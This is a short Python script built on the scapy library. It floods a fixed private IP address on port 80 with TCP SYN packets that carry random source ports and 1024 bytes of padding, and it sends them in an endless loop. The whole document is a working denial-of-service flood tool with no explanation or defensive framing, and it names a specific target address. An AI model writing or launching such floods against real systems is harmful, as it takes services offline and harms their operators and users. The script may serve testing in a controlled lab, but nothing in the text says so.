import sys
sys.modules['cryptography'] = None
from scapy.all import IP, TCP, send, RandShort, Raw

target_ip = "172.30.119.53"
target_port = 80
ip = IP(dst=target_ip)

tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

raw = Raw(b"X"*1024)

p = ip / tcp / raw
send(p, loop=1, verbose=2)
